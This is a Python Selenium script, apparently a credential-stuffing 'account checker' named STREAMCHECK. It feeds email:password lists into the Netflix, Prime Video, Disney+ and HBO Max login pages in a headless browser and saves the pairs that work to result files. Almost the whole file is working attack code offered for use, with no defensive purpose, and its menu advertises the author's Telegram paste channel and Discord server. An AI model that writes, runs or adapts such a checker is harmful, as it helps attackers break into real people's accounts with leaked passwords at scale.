import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from colorama import Fore, init
import webbrowser
import time

init(autoreset=True)

# Configuración automática de Selenium con WebDriver Manager
chrome_options = Options()
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--headless")  # Ejecutar Chrome en modo headless
chrome_options.add_argument("--log-level=3")  # Reducir el nivel de logs para suprimir DevTools

service = Service(ChromeDriverManager().install())

# URLs de inicio de sesión de cada plataforma
PLATFORMS = {
    "1": ("Netflix", "https://www.netflix.com/login", "cuentas/netflix.txt", "resultados/validos_netflix.txt"),
    "2": ("Prime Video", "https://www.amazon.com/ap/signin", "cuentas/prime.txt", "resultados/validos_prime.txt"),
    "3": ("Disney+", "https://www.disneyplus.com/login", "cuentas/disney.txt", "resultados/validos_disney.txt"),
    "4": ("HBO Max", "https://www.max.com/signin", "cuentas/hbo.txt", "resultados/validos_hbo.txt")
}

def login_checker(platform_name, login_url, input_file, output_file):
    """Función para verificar cuentas en la plataforma seleccionada."""
    try:
        with open(input_file, "r") as file:
            accounts = file.readlines()
    except FileNotFoundError:
        print(f"No se encontró el archivo {input_file}.")
        return

    # Asegurar que las carpetas de resultados y cuentas existan
    os.makedirs(os.path.dirname(output_file), exist_ok=True)

    # Configurar el navegador
    driver = webdriver.Chrome(service=service, options=chrome_options)
    driver.get(login_url)
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))  # Esperar que cargue la página

    for account in accounts:
        email, password = account.strip().split(":")
        print(f"🔍 Probando {email} en {platform_name}...")

        try:
            if platform_name == "Netflix":
                user_input = driver.find_element(By.NAME, "userLoginId")
                pass_input = driver.find_element(By.NAME, "password")
                user_input.clear()  # Limpiar el campo antes de insertar
                pass_input.clear()
                user_input.send_keys(email)
                pass_input.send_keys(password)
                pass_input.send_keys(Keys.RETURN)
            
            elif platform_name == "Prime Video":
                user_input = driver.find_element(By.ID, "ap_email")
                pass_input = driver.find_element(By.ID, "ap_password")
                user_input.clear()
                pass_input.clear()
                user_input.send_keys(email)
                pass_input.send_keys(password)
                pass_input.send_keys(Keys.RETURN)

            elif platform_name == "Disney+":
                user_input = driver.find_element(By.CSS_SELECTOR, "input[type='email']")
                user_input.clear()
                user_input.send_keys(email)
                user_input.send_keys(Keys.RETURN)
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password']")))  # Esperar el campo de la contraseña
                pass_input = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
                pass_input.clear()
                pass_input.send_keys(password)
                pass_input.send_keys(Keys.RETURN)

            elif platform_name == "HBO Max":
                user_input = driver.find_element(By.NAME, "email")
                pass_input = driver.find_element(By.NAME, "password")
                user_input.clear()
                pass_input.clear()
                user_input.send_keys(email)
                pass_input.send_keys(password)
                pass_input.send_keys(Keys.RETURN)

            WebDriverWait(driver, 10).until(EC.url_changes(login_url))  # Esperar si la URL cambia después del login

            # Verificar si el login fue exitoso
            if driver.current_url != login_url:  # Si cambia la URL, el login fue exitoso
                print(f"✅ Cuenta válida: {email}")
                with open(output_file, "a") as valid_file:
                    valid_file.write(f"{email}:{password}\n")
            else:
                # Si el login falló, capturar el mensaje de error
                error_message = ""
                if platform_name == "Netflix":
                    try:
                        error_message = driver.find_element(By.CLASS_NAME, "ui-message-contents").text  # Mensaje de error en Netflix
                    except:
                        pass
                elif platform_name == "Prime Video":
                    try:
                        error_message = driver.find_element(By.XPATH, "//*[contains(text(),'Correo electrónico o contraseña incorrectos')]").text  # Error en Prime Video
                    except:
                        pass
                elif platform_name == "Disney+":
                    try:
                        error_message = driver.find_element(By.XPATH, "//*[contains(text(),'Correo o contraseña incorrectos')]").text  # Error en Disney+
                    except:
                        pass
                elif platform_name == "HBO Max":
                    try:
                        error_message = driver.find_element(By.XPATH, "//*[contains(text(),'La dirección de correo electrónico o la contraseña es incorrecta')]").text  # Error en HBO Max
                    except:
                        pass

                print(f"❌ Falló el inicio de sesión: {email} | Razón: {error_message if error_message else 'Desconocido'}")

        except Exception as e:
            print(f"⚠️ Error con {email}: {str(e)}")

    driver.quit()  # Cerrar el navegador después de procesar todas las cuentas

print(Fore.MAGENTA + "\n📺 STREAMCHECK 📺")
print(Fore.MAGENTA + "BY " + Fore.MAGENTA + "NOCTAMBULO / " + Fore.CYAN + "Nocta.")
print(Fore.RED + "1. Netflix")
print(Fore.GREEN + "2. Prime Video")
print(Fore.CYAN + "3. Disney+")
print(Fore.MAGENTA + "4. HBO Max")
print(Fore.YELLOW + "5. Salir")
print(Fore.LIGHTCYAN_EX + "6. Abrir mi Telegram en Web")
print(Fore.LIGHTRED_EX + "7. Abrir mi servidor de Discord")

# Aquí puedes capturar la opción del usuario
opcion = input("Selecciona una opción (1-7): ")

if opcion == "6":
    # Reemplaza el enlace con el de tu Telegram Web
    webbrowser.open("https://t.me/NoctaPaste")
    print("Abriendo Telegram en Web...")

elif opcion == "7":
    # Reemplaza el enlace con el de tu servidor de Discord
    webbrowser.open("https://discord.gg/a8vSeEMqgj")
    print("Abriendo tu servidor de Discord...")

elif opcion == "5":
    print("Saliendo del programa...")

elif opcion in PLATFORMS:
    plataforma, url, archivo, salida = PLATFORMS[opcion]
    login_checker(plataforma, url, archivo, salida)
    print(f"✅ El proceso de verificación para {plataforma} ha finalizado.")

else:
    print("❌ Opción no válida, ejecuta el programa nuevamente.")

